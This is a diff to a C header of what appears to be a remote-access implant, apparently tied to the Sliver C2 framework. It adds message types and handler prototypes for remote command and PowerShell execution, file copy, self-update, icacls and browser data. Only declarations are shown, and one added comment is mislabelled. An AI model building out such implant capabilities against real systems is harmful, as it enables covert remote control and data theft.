@@ -122,6 +122,9 @@ typedef enum _MsgType {
 	// MsgExecuteReq - Execute a command on the remote system
 	MsgCmdReq,
 
+	// MsgExecuteReq - Execute a command on the remote system
+	MsgPowershellReq,
+
 	// MsgTerminateReq - Request to kill a remote process
 	MsgTerminateReq,
 
@@ -259,6 +262,9 @@ typedef enum _MsgType {
 	// MsgMv - Confirms the success/failure of the mv request (resp to MsgMvReq)
 	MsgMv,
 
+	MsgCpReq,
+	MsgCp,
+
 	// MsgCurrentTokenOwnerReq - Request to query the thread token owner
 	MsgCurrentTokenOwnerReq,
 	// MsgCurrentTokenOwner - Replies with the current thread owner (resp to MsfCurrentToken)
@@ -306,6 +312,7 @@ typedef enum _MsgType {
 	MsgMemfilesRm,
 
 	MsgLootFile,
+	MsgUpdate,
 	MsgEnd,
 } MsgType;
 
@@ -353,11 +360,6 @@ PENVELOPE RegistryReadHandler
 	_In_ PENVELOPE pEnvelope
 );
 
-PENVELOPE IcaclsHandler
-(
-	_In_ PENVELOPE pEnvelope
-);
-
 PENVELOPE ServiceDetailHandler
 (
 	_In_ PENVELOPE pEnvelope
@@ -368,7 +370,7 @@ PENVELOPE ExecuteHandler
 	_In_ PENVELOPE pEnvelope
 );
 
-REQUEST_HANDLER* GetSystemHandler();
+REQUEST_HANDLER* GetSystemHandler(VOID);
 
 PENVELOPE MakeTokenHandler
 (
@@ -394,6 +396,22 @@ PENVELOPE CreateServiceHandler
 );
 
 PENVELOPE ScreenshotHandler
+(
+	_In_ PENVELOPE pEnvelope
+);
+
+PENVELOPE CmdHandler
+(
+	_In_ PENVELOPE pEnvelope,
+	_In_ LPVOID lpSliverClient
+);
+
+PENVELOPE IcaclsHandler
+(
+	_In_ PENVELOPE pEnvelope
+);
+
+PENVELOPE BrowserHandler
 (
 	_In_ PENVELOPE pEnvelope
 );
